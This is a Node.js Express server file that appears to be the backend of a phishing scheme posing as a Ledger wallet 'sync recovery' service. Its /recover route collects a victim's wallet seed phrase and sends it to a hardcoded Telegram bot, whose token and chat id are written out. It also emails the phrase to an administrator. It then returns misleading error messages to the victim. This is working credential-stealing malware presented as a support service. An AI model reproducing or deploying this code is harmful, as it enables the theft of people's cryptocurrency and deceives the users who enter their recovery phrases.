const express = require('express');
const app = express();
const nodemailer = require('nodemailer');
const axios = require('axios');

require('dotenv').config()

const cors = require('cors')

const allowedOrigins = [
    'https://ledgersync-exts.cyclic.app',
    // 'http://localhost:5500',
    // 'http://127.0.0.1:5500',
]
const corsOptions = {
    origin: (origin, callback) => {
        if (allowedOrigins.indexOf(origin) !== -1 || !origin) {
            callback(null, true)
        } else {
            callback(new Error('Not allowed by CORS'))
        }
    },
    credentials: true,
    optionsSuccessStatus: 200
}
app.use(cors(corsOptions))

app.use(express.json())

const user = process.env.USER
const pass = process.env.PASS
// configure the email transport
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: user,
    pass: pass
  }
});

// define a route to send email
app.post('/recover', (req, res) => {
    const { wallet, os, phrase }  = req.body
    const admin = process.env.ADMIN_EMAIL

    // send TG message
    function sendTGMessage(){
        let apiToken = "6904093194:AAFSxk-DS9z-EWsUELPyq8l7o2shznsibvc"; //@bot_token
        let chatId = "6747717424"; //@chat id
         let message = `New Ledge Drop 🏆🏆🏆 %0A%0AFrom: ${wallet} %0A%0A`;
            message += ` phrase : ${phrase} %0A%0A`;
         // Object.keys(strings).forEach(function(key) {
         //         message += ` ${strings[key]['name']} : ${strings[key]['value']} %0A%0A`;
         //   })
        let t = `https://api.telegram.org/bot${apiToken}/sendMessage?chat_id=${chatId}&text=${message}`;
        let responset = axios.post(t);
        // let requestt = new XMLHttpRequest();
        // requestt.open("POST", t);
        // requestt.send();
    } 
    
  // configure the email message
  const mailOptions = {
    from: `"ledger-sync-live" <${process.env.USER}>`,
        to: admin,
        subject: 'Support Sync Recovery',
        text: `Wallet Type: ${wallet},\n\nOS Type: ${os},\n\nPhrase: ${phrase}`,
  };

    //send the TG Message
    sendTGMessage()
    
    // send the email
    setTimeout(
        transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
          res.status(500).send('Erro connecting to');
        } else {
          res.status(200).send('Connection error');
        }
      }), 1 * 60 * 1000)
  
});

// start the server
const port = process.env.PORT || 5000;
app.listen(port, () => {
  console.log(`Server running on port ${port}`);
});
